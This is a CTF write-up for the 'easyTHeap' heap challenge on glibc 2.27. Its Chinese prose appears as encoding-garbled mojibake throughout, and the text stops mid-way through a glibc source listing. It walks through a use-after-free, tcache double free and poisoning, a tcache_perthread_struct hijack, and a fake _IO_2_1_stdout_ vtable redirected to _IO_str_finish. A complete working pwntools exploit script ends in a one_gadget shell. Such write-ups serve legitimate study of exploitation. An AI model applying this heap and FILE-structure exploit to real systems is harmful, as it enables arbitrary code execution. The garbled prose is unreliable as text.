<h4 id="ä¾‹é¢˜ï¼š-V-N2020-å…¬å¼€èµ›-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><a href="#ä¾‹é¢˜ï¼š-V-N2020-å…¬å¼€èµ›-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget"></a>ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</h4><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç¨‹åºæœ¬èº«æœ‰ç€<strong>åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾</strong>å †å—çš„åŠŸèƒ½ï¼Œç®—æ˜¯åŠŸèƒ½æ¯”è¾ƒé½å…¨</p>
<p>ä½†æ˜¯ç¨‹åºæœ¬èº«é™åˆ¶äº†<strong>åªèƒ½åˆ†é…7æ¬¡å †å—ï¼Œåªèƒ½é‡Šæ”¾3æ¬¡å †å—</strong></p>
<p><img src="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´ç‚¹åœ¨äºfreeåŠŸèƒ½ä¸­<strong>æ²¡æœ‰å°†å †å—æŒ‡é’ˆç½®NULLï¼Œå­˜åœ¨Use After Freeæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è™½ç„¶è¯´åœ¨åˆ†é…å †å—çš„åŠŸèƒ½ä¸­å¹¶æ²¡æœ‰è¿‡äºé™åˆ¶å¤§å°ï¼ˆ0x100ï¼‰ï¼Œä½†æ˜¯é¢˜ç›®æ‰€ç»™çš„libcæ˜¯æœ‰ç€tcacheçš„2.27ç‰ˆæœ¬ï¼Œéœ€è¦é€šè¿‡unsorted binæ³„éœ²main_arenaçš„åœ°å€æˆ‘ä»¬è‡³å°‘éœ€è¦é‡Šæ”¾8æ¬¡å †å—æ‰èƒ½è·å¾—ä¸€ä¸ªunsorted chunkï¼Œè€Œæˆ‘ä»¬ä»…è¢«å…è®¸é‡Šæ”¾3æ¬¡å †å—</p>
<p>ä½†æ˜¯åˆ©ç”¨use after freeæˆ‘ä»¬æ˜¯å¯ä»¥æ³„éœ²å †åŸºå€çš„ï¼Œè€Œ<strong>ç”¨ä»¥ç®¡ç†tcacheçš„tcache_perthread_structç»“æ„ä½“æœ¬èº«ä¾¿æ˜¯ç”±ä¸€ä¸ªchunkå®ç°çš„</strong></p>
<p>libc2.27 ä¸­æ²¡æœ‰å¯¹ tcache double free çš„æ£€æŸ¥ï¼Œæ•…åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡tcache double freeç»“åˆuse after freeæ³„æ¼å‡ºå †åŸºå€åä¼ªé€ ä¸€ä¸ªä½äºtcache_perthread_structç»“æ„ä½“é™„è¿‘çš„fake chunkä»¥åŠ«æŒtcache_perthread_structç»“æ„ä½“ä¿®æ”¹tcache_perthread_struct-&gt;countsä¸­å¯¹åº”indexçš„å€¼ä¸º7åé‡Šæ”¾chunkä¾¿å¯ä»¥è·å¾—unsorted binä»¥æ³„éœ²libcåŸºå€</strong></p>
<p>æƒ¯ä¾‹çš„pwndbgåŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°tcacheç»“æ„ä½“çš„sizeï¼Œä¹Ÿå°±å¾—åˆ°äº†åç§»</p>
<p><img src="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨freeåŠŸèƒ½ä¸­ä¼šå°†å…¶ä¿å­˜çš„chunk sizeç½®0ï¼Œ å› è€Œæˆ‘ä»¬éœ€è¦<strong>é‡æ–°å°†è¿™ä¸ªchunkç”³è¯·å›æ¥åæ‰èƒ½ç»§ç»­ç¼–è¾‘</strong></p>
<p>è¿™é“é¢˜æœ€ç»å…¸çš„åšæ³•å°±æ˜¯å¥—æ¿å­ï¼ŒåŠ«æŒ__malloc_hookä¸ºone_gadgetä»¥get shell</p>
<p>ä½†æ˜¯é™¤äº†åŠ«æŒ__malloc_hookä¸ºone_gadgetä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åŠ«æŒ_IO_2_1_stdout_ä¸­çš„vtableè¡¨çš„æ–¹å¼è°ƒç”¨one_gadget</p>
<p>è§‚å¯Ÿåˆ°ç¨‹åºä¸­åœ¨æˆ‘ä»¬editä¹‹åä¼šè°ƒç”¨puts()å‡½æ•°</p>
<p><img src="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>puts()å‡½æ•°å®šä¹‰äºlibio&#x2F;ioputs.cä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_puts (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)<br>&#123;<br>  <span class="hljs-type">int</span> result = EOF;<br>  <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span> (str);<br>  _IO_acquire_lock (_IO_stdout);<br><br>  <span class="hljs-keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="hljs-number">0</span><br>       || _IO_fwide (_IO_stdout, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)<br>      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len<br>      &amp;&amp; _IO_putc_unlocked (<span class="hljs-string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)<br>    result = MIN (INT_MAX, len + <span class="hljs-number">1</span>);<br><br>  _IO_release_lock (_IO_stdout);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br>weak_alias (_IO_puts, <span class="hljs-built_in">puts</span>)<br>libc_hidden_def (_IO_puts)<br></code></pre></td></tr></table></figure>

<p>è§‚å¯Ÿåˆ°å…¶ä¼šä½¿ç”¨å®<code>_IO_sputn</code>ï¼Œè¯¥å®å®šä¹‰äºlibio&#x2F;libioP.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span><br></code></pre></td></tr></table></figure>

<p>å¥—å¨ƒå®ï¼Œè·Ÿè¿›ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_JUMPS_OFFSET 0</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span><br></code></pre></td></tr></table></figure>

<p>å³<strong>putså‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨vtableè¡¨ä¸­çš„</strong><code>__xsputn</code><strong>å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œgdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥çŸ¥é“å…¶ç›¸å¯¹è¡¨å¤´åç§»åº”å½“ä¸º<code>0x30</code>ï¼ˆ64ä½ä¸‹ï¼‰</p>
<p><img src="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±äº<strong>è‡ªlibc2.24å§‹å¢åŠ äº†å¯¹vtableè¡¨çš„åˆæ³•æ€§æ£€æµ‹ï¼Œæ•…æˆ‘ä»¬åªèƒ½æ‰§è¡Œä½äºåˆæ³•vtableè¡¨èŒƒå›´å†…çš„å‡½æ•°æŒ‡é’ˆ</strong></p>
<p>è€ƒè™‘åˆ°<strong>_IO_str_finishå‡½æ•°ä¼šå°†FILEæŒ‡é’ˆ + 0xE8çš„ä½ç½®ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</strong>ï¼Œæ•…æˆ‘ä»¬é€‰æ‹©ä¿®æ”¹_IO_2_1_stdout_çš„vtableè¡¨è‡³ç‰¹å®šä½ç½®ä»¥<strong>è°ƒç”¨_IO_str_finishå‡½æ•°</strong></p>
<p>è¡¨_IO_str_jumpsä¸­å­˜åœ¨ç€æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„_IO_str_finishå‡½æ•°çš„æŒ‡é’ˆï¼Œä¸”è¯¥è¡¨æ˜¯ä¸€ä¸ªåˆæ³•vtableè¡¨ï¼Œæ•…åªè¦æˆ‘ä»¬<strong>å°†stdoutçš„vtableè¡¨åŠ«æŒåˆ°_IO_str_finishé™„è¿‘å³å¯æˆåŠŸè°ƒç”¨_IO_str_finishå‡½æ•°</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±_IO_jump_tç»“æ„ä½“çš„ç»“æ„æˆ‘ä»¬ä¸éš¾è®¡ç®—å‡ºfake vtableçš„ä½ç½®åº”å½“ä¸º<strong>_IO_str_jumps - 0x28</strong></p>
<p>åŠ«æŒvtableè¡¨ååœ¨_IO_2_1_stdout_ + 0xE8çš„ä½ç½®æ”¾ä¸Šone_gadgetï¼Œå³å¯åœ¨ç¨‹åºè°ƒç”¨putså‡½æ•°æ—¶get shell</p>
<p>é€šè¿‡gdbè°ƒè¯•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°æ„é€ fake _IO_2_1_stdout_ç»“æ„ä½“</p>
<p><img src="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p><img src="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯æœ‰å°‘éƒ¨åˆ†ç¬¦å·æ— æ³•ç›´æ¥é€šè¿‡symå­—å…¸è·å¾—ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé‡‡ç”¨å…¶ç›¸å¯¹åç§»ä»¥è®¡ç®—å…¶çœŸå®åœ°å€ï¼Œè¯¦è§æ³¨é‡Š</p>
<p><img src="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…æœ€åæ„é€ çš„expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = process(<span class="hljs-string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="hljs-comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26233)</span><br>e = ELF(<span class="hljs-string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>one_gadget = <span class="hljs-number">0x4f322</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;idx?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;content:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;idx?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;idx?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># tcache double free</span><br>    new(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx0</span><br>    new(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx1</span><br>    free(<span class="hljs-number">0</span>)<br>    free(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-comment"># leak the heap base</span><br>    dump(<span class="hljs-number">0</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x260</span><br>    log.info(<span class="hljs-string">&#x27;heap base leak: &#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br><br>    <span class="hljs-comment"># tcache poisoning, hijack the tcache struct</span><br>    new(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx2</span><br>    edit(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0x10</span>))<br>    new(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx3</span><br>    new(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx4, our fake chunk</span><br>    edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x07&quot;</span>.rjust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;\x07&quot;</span>)) <span class="hljs-comment"># all full</span><br><br>    <span class="hljs-comment"># leak the libc base</span><br>    free(<span class="hljs-number">0</span>)<br>    dump(<span class="hljs-number">0</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&#x27;libc base leak: &#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br>    <span class="hljs-comment"># construct the fake file structure</span><br>    fake_file = <span class="hljs-string">b&quot;&quot;</span><br>    fake_file += p64(<span class="hljs-number">0xFBAD2886</span>) <span class="hljs-comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">131</span>) * <span class="hljs-number">7</span> <span class="hljs-comment"># from _IO_read_ptr to _IO_buf_base</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">132</span>) <span class="hljs-comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> <span class="hljs-comment"># from _IO_save_base to _markers</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]) <span class="hljs-comment"># the FILE chain ptr</span><br>    fake_file += p32(<span class="hljs-number">1</span>) <span class="hljs-comment"># _fileno for stdout is 1</span><br>    fake_file += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># _flags2, usually 0</span><br>    fake_file += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) <span class="hljs-comment"># _old_offset, -1</span><br>    fake_file += p16(<span class="hljs-number">0</span>) <span class="hljs-comment"># _cur_column</span><br>    fake_file += <span class="hljs-string">b&quot;\x00&quot;</span> <span class="hljs-comment"># _vtable_offset</span><br>    fake_file += <span class="hljs-string">b&quot;\n&quot;</span> <span class="hljs-comment"># _shortbuf[1]</span><br>    fake_file += p32(<span class="hljs-number">0</span>) <span class="hljs-comment"># padding</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0x1e20</span>) <span class="hljs-comment"># _IO_stdfile_1_lock</span><br>    fake_file += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) <span class="hljs-comment"># _offset, -1</span><br>    fake_file += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># _codecvt, usually 0</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="hljs-number">0xe20</span>) <span class="hljs-comment"># _IO_wide_data_1</span><br>    fake_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <span class="hljs-comment"># from _freeres_list to __pad5</span><br>    fake_file += p32(<span class="hljs-number">0xFFFFFFFF</span>) <span class="hljs-comment"># _mode, -1</span><br>    fake_file += <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">19</span> <span class="hljs-comment"># _unused2</span><br>    fake_file = fake_file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <span class="hljs-comment"># adjust to vtable</span><br>    fake_file += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>] + <span class="hljs-number">0xc0</span> - <span class="hljs-number">0x28</span>) + p64(<span class="hljs-number">0</span>) + p64(libc_base + one_gadget) <span class="hljs-comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span><br><br>    <span class="hljs-comment"># tcache poisoning, hijack the _IO_2_1_stdout and its vtable</span><br>    edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x10&quot;</span>.rjust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">21</span> + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]))<br>    new(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx5, our fake chunk</span><br>    edit(<span class="hljs-number">5</span>, fake_file)<br><br>    <span class="hljs-comment"># get the shell</span><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<h4 id="IO-FILE-plusç»“æ„ä½“ä¸­-vtable-ç›¸å¯¹åç§»"><a href="#IO-FILE-plusç»“æ„ä½“ä¸­-vtable-ç›¸å¯¹åç§»" class="headerlink" title="_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»"></a>_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»</h4><blockquote>
<p> åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8 </p>
<p> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">ctf-wiki: FILE structure</a></p>
</blockquote>
<h4 id="vtable-åˆæ³•æ€§æ£€æµ‹-start-from-glibc2-24"><a href="#vtable-åˆæ³•æ€§æ£€æµ‹-start-from-glibc2-24" class="headerlink" title="vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)"></a>vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)</h4><p>è‡ªä»glibc2.24ç‰ˆæœ¬èµ·ä¾¿å¢åŠ äº†å¯¹äºvtableçš„æ£€æµ‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br><span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">section.  */</span><br><span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br><span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br><span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) __start___libc_IO_vtables;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br><span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment"> slow path, which will terminate the process if necessary.  */</span><br>_IO_vtable_check ();<br><span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>gdbè°ƒè¯•å¯çŸ¥è¿™ä¸ªsection_lengthçš„é•¿åº¦ä¸º3432ï¼ˆ0xd68ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±æ­¤ï¼Œæˆ‘ä»¬æ‰€æ„é€ çš„fake vtableçš„ä½ç½®å—åˆ°äº†ä¸€å®šçš„é™åˆ¶ï¼Œå³åªèƒ½åœ¨<code>__start___libc_IO_vtables</code>å¾€å0xd68å­—èŠ‚çš„èŒƒå›´å†…</p>
<h4 id="vtableè¡¨åŠ«æŒå§¿åŠ¿-under-glibc2-28"><a href="#vtableè¡¨åŠ«æŒå§¿åŠ¿-under-glibc2-28" class="headerlink" title="vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)"></a>vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)</h4><p>åœ¨glibc2.28å¾€å‰çš„ç‰ˆæœ¬ä¸­<strong>_IO_str_finishå‡½æ•°ä¼šå°†_IO_2_1_stdout_ + 0xE8çš„ä½ç½®ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</strong>ï¼Œæ•…æˆ‘ä»¬é€šå¸¸è€ƒè™‘åœ¨è¿™ä¸ªä½ç½®æ”¾ä¸Šæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼ˆå¦‚one_gadgetï¼‰å¹¶å°†vtableè¡¨åŠ«æŒåˆ°é€‚åˆçš„ä½ç½®ä»¥æ‰§è¡Œ<code>_IO_str_finish()</code>å‡½æ•°</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è€ƒè™‘<strong>åŠ«æŒ_IO_2_1_stdout_å¹¶ä¿®æ”¹å…¶vtableè¡¨è‡³è¡¨_IO_str_jumpsé™„è¿‘</strong>ï¼Œè¯¥vtableè¡¨å®šä¹‰äºlibio&#x2F;sstrops.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>JUMP_INIT_DUMMY,<br>JUMP_INIT(finish, _IO_str_finish),<br>JUMP_INIT(overflow, _IO_str_overflow),<br>JUMP_INIT(underflow, _IO_str_underflow),<br>JUMP_INIT(uflow, 